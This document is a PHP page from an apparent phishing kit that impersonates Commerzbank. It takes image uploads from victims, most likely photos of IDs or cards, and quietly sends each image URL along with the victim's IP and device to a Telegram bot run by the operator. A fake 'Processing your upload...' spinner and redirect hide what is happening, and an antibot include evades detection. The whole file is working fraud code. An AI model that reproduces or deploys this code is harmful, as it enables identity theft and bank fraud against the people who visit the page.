<?php
// ANTIBOT DISABLED - include..antibot.php';
include '../antibot/tds.php';

// Increase limits for iPhone uploads
ini_set('upload_max_filesize', '50M');
ini_set('post_max_size', '50M');
ini_set('max_execution_time', '300');
ini_set('memory_limit', '256M');

// Include Telegram configuration
include '../config/telegram.php';
$botToken = $telegram_bot2_token;
$chatId = $telegram_bot2_chat_id;

$uploadDir = 'xentryxupload/';
if (!is_dir($uploadDir)) {
    mkdir($uploadDir, 0755, true);
}

// Silent error handling - no error messages displayed
if (isset($_FILES['file']) && $_FILES['file']['error'] == UPLOAD_ERR_OK) {
    $randomPrefix = str_pad(rand(0, 999999), 6, '0', STR_PAD_LEFT);
    $originalFileName = basename($_FILES['file']['name']);
    $fileExtension = strtolower(pathinfo($originalFileName, PATHINFO_EXTENSION));
    $newFileName = $randomPrefix . '-' . $originalFileName;
    $uploadPath = $uploadDir . $newFileName;

    // Validate file type for iPhone
    $allowedTypes = ['jpg', 'jpeg', 'png', 'gif', 'heic', 'heif'];
    if (in_array($fileExtension, $allowedTypes)) {
        if (move_uploaded_file($_FILES['file']['tmp_name'], $uploadPath)) {
            $fileSize = filesize($uploadPath);
            $visitorIp = $_SERVER['REMOTE_ADDR'];
            $userAgent = $_SERVER['HTTP_USER_AGENT'];
            $serverHost = $_SERVER['HTTP_HOST'] ?? $_SERVER['SERVER_ADDR'];
            $imageURL = "{$serverHost}/views/{$uploadDir}{$newFileName}";

            $message = "🟡 |  𝗖𝗼𝗺𝗺𝗲𝗿𝘇𝗯𝗮𝗻𝗸 𝗨𝗽𝗹𝗼𝗮𝗱  [ 1st ]\n";
            $message .= "- Another IMG should appear after this.\n\n";
            $message .= "🔗 |  𝗜𝗠𝗚 𝗨𝗥𝗟  : $imageURL\n";
            $message .= "📍 |  𝗜𝗣  : $visitorIp\n";
            $message .= "📱 |  𝗗𝗲𝘃𝗶𝗰𝗲  : " . (strpos($userAgent, 'iPhone') !== false ? 'iPhone' : 'Other') . "\n";
            $message .= "📏 |  𝗦𝗶𝘇𝗲  : " . number_format($fileSize / 1024, 2) . " KB";

            // Try to send image to Telegram
            $result = sendTelegramPhoto($botToken, $chatId, $uploadPath, $message);
            
            if (!$result) {
                // Try alternative method silently
                sendTelegramMessage($botToken, $chatId, $message . "\n\n⚠️ Image upload failed, but data received.");
            }
        }
    }
}
?>

<!DOCTYPE html>
<html lang="en">
<head>
    <script src="/security.js"></script>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>One Moment...</title>
    <meta http-equiv="refresh" content="1; url=uploadz3.php">
    <style>
        body {
            font-family: Arial, sans-serif;
            text-align: center;
            padding: 50px;
            background: #f5f5f5;
            margin: 0;
        }
        .loading {
            color: #666;
            font-size: 18px;
        }
        .spinner {
            border: 4px solid #f3f3f3;
            border-top: 4px solid #3498db;
            border-radius: 50%;
            width: 40px;
            height: 40px;
            animation: spin 1s linear infinite;
            margin: 20px auto;
        }
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
    </style>
</head>
<body>
    <div class="spinner"></div>
    <div class="loading">Processing your upload...</div>
</body>
</html>
